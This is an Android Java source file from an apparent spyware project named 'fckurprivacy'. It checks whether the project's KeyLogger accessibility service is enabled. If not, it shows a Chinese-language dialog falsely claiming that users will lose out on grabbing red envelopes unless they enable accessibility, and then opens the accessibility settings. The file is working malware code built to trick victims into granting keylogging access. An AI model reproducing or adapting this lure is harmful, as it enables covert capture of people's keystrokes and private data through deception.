package com.vergermiya.harevost.fckurprivacy.Util;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogger;

import static android.content.ContentValues.TAG;

/**
 * Created by harevost on 18-7-19.
 */

public class AccessibilityChecker {

    private static boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;

        final String service = mContext.getPackageName() + "/" + KeyLogger.class.getCanonicalName();
        Log.d(TAG, "service:" + service);

        try {
            accessibilityEnabled = Settings.Secure.getInt(mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
            Log.d(TAG, "accessibilityEnabled = " + accessibilityEnabled);
        } catch (Settings.SettingNotFoundException e) {
            Log.d(TAG, "Error finding setting, default accessibility to not found: " + e.getMessage());
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            Log.d(TAG, "***ACCESSIBILITY IS ENABLED*** -----------------");
            String settingValue = Settings.Secure.getString(mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();

                    Log.d(TAG, "-------------- > accessibilityService :: " + accessibilityService + " " + service);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d(TAG, "We've found the correct setting - accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
            Log.d(TAG, "***ACCESSIBILITY IS DISABLED***");
        }
        return false;
    }

    public static void setAccessibilitySetting(final Context mContext) {
        if (!isAccessibilitySettingsOn(mContext)) {
            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(mContext);

            alertDialogBuilder.setTitle("辅助功能")
                            .setMessage("若不开启辅助功能，则无法抢红包，造成损失")
                            .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialogInterface, int i) {
                                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                        mContext.startActivity(intent);
                                }
                            });

            AlertDialog alertDialog = alertDialogBuilder.create();
            alertDialog.show();
        }
    }
}
